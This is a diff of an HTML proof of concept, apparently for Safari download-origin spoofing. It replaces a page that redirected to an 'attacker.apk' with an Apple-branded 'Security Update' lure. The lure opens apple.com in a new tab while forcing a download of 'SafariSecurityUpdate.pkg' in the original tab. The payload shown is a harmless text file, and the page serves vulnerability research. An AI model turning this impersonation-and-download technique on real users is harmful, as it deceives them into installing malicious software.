@@ -1,44 +1,69 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <title>Example Origin Spoof</title>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apple Security Verification</title>
     <style>
-      .button {
-        background-color: #4caf50;
-        border: none;
-        color: white;
-        padding: 15px 32px;
-        text-align: center;
-        text-decoration: none;
-        display: inline-block;
-        font-size: 16px;
-        margin: 4px 2px;
-        cursor: pointer;
-      }
+        body { 
+            font-family: -apple-system, sans-serif; 
+            display: flex; justify-content: center; align-items: center; 
+            height: 100vh; margin: 0; background: #f5f5f7; 
+        }
+        .card { 
+            background: white; padding: 40px; border-radius: 18px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08); text-align: center; max-width: 400px;
+        }
+        .btn { 
+            display: inline-block; padding: 12px 25px; background: #0071e3; 
+            color: white; text-decoration: none; border-radius: 8px; font-weight: 500;
+        }
     </style>
-  </head>
-  <body>
+</head>
+<body>
+
+    <div class="card">
+        <img src="https://www.apple.com/ac/structured-data/images/knowledge_graph_logo.png" width="50" alt="Apple">
+        <h1>Security Update</h1>
+        <p>A critical update is required for your Safari browser. Please verify your session on the official site.</p>
+        
+        <a href="#" id="start-btn" class="btn">Verify at Apple.com</a>
+    </div>
+
     <script>
-      function a() {
-        const w = window.open("https://example.com/", "example.com");
+        const btn = document.getElementById('start-btn');
 
-        setTimeout(function () {
-          if (w) {
-            w.location.href =
-              "https://azza0x1a.github.io/safarispoof/attacker.apk";
-          }
-        }, 3000);
-      }
+        btn.onclick = (e) => {
+            e.preventDefault();
+
+            // 1. Buka Apple.com di TAB BARU (User fokus ke sini)
+            window.open("https://www.apple.com", "_blank");
+
+            // 2. Di TAB INI (Attacker Tab), langsung ganti rute ke download
+            // Kita kasih delay 1 detik biar transisi tab-nya smooth
+            setTimeout(() => {
+                triggerDownload();
+            }, 1000);
+        };
+
+        function triggerDownload() {
+            const fakeFileContent = "This is a proof-of-concept file for Apple Security Research.";
+            const blob = new Blob([fakeFileContent], { type: 'application/octet-stream' });
+            const blobUrl = URL.createObjectURL(blob);
+
+            const a = document.createElement('a');
+            a.href = blobUrl;
+            a.download = 'SafariSecurityUpdate.pkg';
+            document.body.appendChild(a);
+            a.click();
+            
+            // Cleanup & Info untuk Analyst
+            URL.revokeObjectURL(blobUrl);
+            document.querySelector('.card').innerHTML = `
+                <h2 style="color:green;">Download Triggered</h2>
+                <p>Check your downloads folder. The PoC has executed while the other tab is at Apple.com.</p>
+            `;
+        }
     </script>
-
-    <center>
-      <input
-        type="button"
-        class="button"
-        value="Download From Example"
-        onclick="a()"
-      />
-    </center>
-  </body>
+</body>
 </html>
